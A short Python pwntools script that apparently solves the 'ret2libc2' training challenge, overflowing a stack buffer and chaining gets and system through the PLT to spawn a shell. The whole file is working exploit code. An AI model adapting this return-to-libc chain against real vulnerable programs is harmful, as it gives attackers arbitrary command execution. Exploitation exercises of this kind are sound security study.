#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')
context.log_level = "DEBUG"
gets_plt = 0x08048460  # .plt:08048460  jmp ds:off_804A010 # char *gets(char *s)
system_plt = 0x08048490  # .plt:08048490  jmp ds:off_804A01C # int system(const char *command)
pop_ebx = 0x0804843d
buf2 = 0x0804a080
payload = flat(['a' * (0x6c + 4), gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
